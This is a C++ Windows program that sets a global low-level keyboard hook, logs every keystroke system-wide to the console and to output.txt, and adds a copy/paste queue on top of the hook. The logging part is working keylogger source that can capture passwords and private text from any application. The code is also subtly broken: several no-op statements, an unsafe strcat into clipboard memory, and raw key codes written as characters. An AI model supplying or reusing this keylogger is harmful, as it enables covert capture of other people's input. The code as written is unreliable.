#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <vector>

const std::string WRITE_FILE = "output.txt";
std::vector<char*> clipboardQueue;

void WriteToFile(char inputChar)
{
  std::ofstream outputFile;
  outputFile.open(WRITE_FILE, std::fstream::app);

  //make enter key (\r) output as a newline (\n)
  if (inputChar == '\r')
  {
    inputChar = '\n';
  }

  std::cout << inputChar;
  outputFile << inputChar;
  outputFile.close();

  return;
}

//The function that implements the key logging functionality
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
   char pressedKey;
   // Declare a pointer to the KBDLLHOOKSTRUCTdsad
   KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
   switch( wParam )
   {
       case WM_KEYDOWN: // When the key has been pressed and released
       {
          //get the key code
          pressedKey = (char)pKeyBoard->vkCode;
          ///////////
          if (pKeyBoard->vkCode == 0x43 && GetKeyState(VK_CONTROL) & 0x8000) {
              WM_COPY;
              Sleep(500);
              OpenClipboard(NULL);
              char* buffer;
              buffer = (char*)GetClipboardData(CF_TEXT);
              strcat (buffer, "v");
              CloseClipboard();
              clipboardQueue.push_back(buffer);
              std::cout << buffer << " copied!\n";
          }
          else if (pKeyBoard->vkCode == 0x56 && GetKeyState(VK_CONTROL) & 0x8000) { // ctrl-v is pressed
              if (clipboardQueue.size() > 0) {
                  const char* output = clipboardQueue[0];
                  const size_t len = strlen(output) + 1;
                  HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                  memcpy(GlobalLock(hMem), output, len);
                  GlobalUnlock(hMem);
                  OpenClipboard(0);
                  EmptyClipboard();
                  SetClipboardData(CF_TEXT, hMem);
                  CloseClipboard();
                  WM_PASTE;
                  clipboardQueue.erase(clipboardQueue.begin());
              }
          }
          ///////////
       }
       break;
       default:
           return CallNextHookEx( NULL, nCode, wParam, lParam );
       break;
   }

    //do something with the pressed key here
    WriteToFile(pressedKey);

   //according to winapi all functions which implement a hook must return by calling next hook
   return CallNextHookEx( NULL, nCode, wParam, lParam);
}

int main()
{
  //Retrieve the applications instance
  HINSTANCE instance = GetModuleHandle(NULL);

  //Open clipboard
  OpenClipboard(NULL);
  EmptyClipboard();
  CloseClipboard();

  //Set a global Windows Hook to capture keystrokes using the function declared above
  HHOOK test1 = SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);

  MSG Msg;

  //Message loop
  while(GetMessage(&Msg, NULL, 0, 0) > 0)
  {
    TranslateMessage(&Msg);
    DispatchMessage(&Msg);
  }

  return 0;
}
